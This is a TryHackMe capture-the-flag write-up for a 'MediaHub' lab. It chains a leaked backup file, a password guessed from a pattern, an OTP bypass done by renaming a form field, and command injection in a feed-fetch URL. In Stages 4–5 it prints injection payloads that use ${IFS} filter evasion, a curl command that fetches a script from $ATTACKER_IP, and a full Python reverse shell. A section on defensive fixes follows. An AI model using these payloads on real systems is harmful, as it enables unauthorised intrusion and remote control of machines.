@@ -1,0 +1,153 @@
+# MediaHub: OTP Logic Flaw to RCE — TryHackMe
+
+**Date:** 2026-09-12  
+**Category:** Web, Full Chain  
+**Skills used:** Nmap, Gobuster, backup file disclosure, password pattern guessing, OTP/authentication logic flaw, command injection, filter evasion, custom reverse shell staging  
+
+> **TL;DR:** A leaked `.bak` file exposed the admin email and password policy, letting me guess
+> the login password. The real find was next: intercepting the OTP request and **renaming the
+> `otp` field to `is_verified` with a value of `true`** bypassed OTP verification entirely — the
+> server trusted a client-supplied flag instead of checking the code server-side. From the admin
+> dashboard, a feed-fetch feature was vulnerable to **command injection**, and after canned
+> reverse shells kept getting caught, I staged a custom Python shell using `${IFS}` and backtick
+> substitution to evade space/character filtering.
+
+## Overview
+The chain: **Nmap recon → Gobuster directory discovery → backup file disclosure → password
+policy guess → OTP bypass via field renaming → command injection in a feed-fetch feature →
+filter evasion → custom reverse shell → RCE.** The standout moment was the OTP bypass — it
+wasn't a code-guessing or brute-force issue, it was a **completely different kind of logic
+flaw**: the server was checking a field that the client controls directly.
+
+## Stage 1 — Recon
+Nmap found **22** (SSH), **53** (DNS), and **80** (HTTP). Two things worth noting even though
+neither was the entry point:
+- The login page enforced a **login-attempt limit** — a properly implemented control that
+  correctly blocked brute-forcing the password directly.
+- The session cookie was missing the **`HttpOnly`** flag (see my Session Management writeup) —
+  not exploited here since no XSS was found, but a real weakness if one existed.
+
+## Stage 2 — Directory Discovery & Backup File Disclosure
+**Gobuster** turned up `login.php`, `dashboard.php`, `config.php`, `otp.php`, `phpmyadmin`, and —
+critically — **`login.php.bak`**, a backup of the login page left in the web root. It contained:
+
+```
+email: admin@mediahub.thm
+password policy: MediaHub + any year
+```
+
+*(This mirrors the pattern-based password guessing from my RecruitCorp writeup — a policy hint
+leaked from source, rather than a hash to crack. Following the pattern, e.g. `MediaHub2026`,
+got past the login step and reached the OTP prompt.)*
+
+## Stage 3 — OTP Bypass via Field Renaming (the real vulnerability)
+The login flow required a one-time password. I intercepted the OTP submission in Burp Suite
+with a throwaway code, `123456`:
+
+```
+------geckoformboundary76995160e3d2c911d004dd028c4efcbe
+Content-Disposition: form-data; name="otp"
+
+123456
+------geckoformboundary76995160e3d2c911d004dd028c4efcbe--
+```
+
+The response was a JSON object confirming failure:
+
+```json
+{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
+```
+
+That `is_verified` field in the **response** was the giveaway. I renamed the form field in my
+**request** from `otp` to `is_verified` and set its value to `true` instead of a guessed code:
+
+```
+Content-Disposition: form-data; name="is_verified"
+
+true
+```
+
+The request succeeded, and refreshing the page logged me in as **admin** — no valid OTP ever
+submitted. This is a **broken authentication logic flaw**: the server-side check wasn't "does
+the submitted OTP match the one issued," it was checking for a client-controllable flag with the
+same name as the one echoed in its own JSON responses. Trusting a field the client can set
+directly for a security decision is the same root failure as the JWT issue in my earlier
+Nexus writeup — **the server trusts a claim instead of verifying state it controls itself.**
+
+## Stage 4 — Discovering Command Injection in a Feed-Fetch Feature
+The admin dashboard had a **file upload** section, but it was properly secured — uploaded shells
+didn't execute, so that path was a dead end (worth noting as a properly implemented control).
+
+A separate **URL input to fetch a feed** looked like it queried something server-side. Testing
+with command substitution confirmed injection:
+
+```
+http://127.0.0.1$(whoami)
+```
+
+The response returned **`www-data`** — the target was passing the input into a shell command
+unsanitized, executing the `$()` substitution as part of it.
+
+## Stage 5 — Filter Evasion & Getting a Stable Shell
+Standard one-line reverse shells kept getting dropped — something in the environment was
+filtering common payload patterns (likely spaces or known shell keywords). After getting stuck,
+I discussed the problem with ChatGPT and landed on a two-step approach using **`${IFS}`** (the shell's
+Internal Field Separator variable) in place of literal spaces, since `${IFS}` expands to a space
+but doesn't match filters looking for a literal space character:
+
+**Step 1 — stage a custom Python reverse shell onto the target:**
+```
+http://127.0.0.1`curl${IFS}-o${IFS}/tmp/reverse.py${IFS}$ATTACKER_IP/reverse.py`
+```
+
+**Step 2 — execute it:**
+```
+http://127.0.0.1`python3${IFS}-c${IFS}"exec(open('/tmp/reverse.py').read())"`
+```
+
+`reverse.py`:
+```python
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("$ATTACKER_IP", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash", "-i"])
+```
+
+With a listener running (`nc -lvnp 4444`), the second request triggered the script and returned
+a full interactive shell, letting me capture the flag.
+
+## The Fix (Defensive View)
+- **Backup files in the web root (Stage 2):** never leave `.bak`, `.old`, or editor swap files
+  reachable over HTTP. Exclude them at the web-server config level in addition to not creating
+  them, and don't embed password policies in source comments at all.
+- **Predictable password policy (Stage 2):** a policy like "brand name + year" is guessable by
+  definition. Enforce real complexity requirements independent of public branding.
+- **OTP logic flaw (Stage 3):** this is the most important fix here. **Never let the client
+  submit or influence a verification-result field.** OTP validation must compare the submitted
+  code against the one issued, server-side and statefully (e.g. tied to the session), and the
+  response should never echo a field name that doubles as something the *next* request could
+  set to bypass the check.
+- **Command injection (Stage 4):** never pass user input into a shell command. Use safe library
+  calls (e.g. Python's `requests` for a feed fetch) instead of shelling out, and if a subprocess
+  call is unavoidable, use its argument-array form with `shell=False` so `$()`/backticks can't be
+  interpreted (see my Command Injection writeup).
+- **Filter evasion via `${IFS}` (Stage 5):** blocking literal spaces or specific keywords is not
+  a real fix — there are many equivalent ways to represent them (`${IFS}`, tabs, `$IFS$9`, etc.).
+  The only durable fix is preventing the injection in the first place (see above), not filtering
+  its payloads after the fact.
+
+## What I Learned
+The OTP bypass was the standout lesson: I went in expecting to have to guess or brute-force a
+code, but the actual bug had nothing to do with the OTP's value — it was that the server checked
+the *wrong thing entirely*, trusting a field name the client could set directly. That's worth
+remembering as its own category of bug distinct from weak OTPs or missing rate limiting: **check
+what field the server is actually validating, not just whether the value can be guessed.** On
+the RCE side, `${IFS}` was a new evasion technique for me, and getting stuck on it was a good
+reminder that when a payload gets silently dropped, the first thing to suspect is character/space
+filtering — not that the injection itself failed.
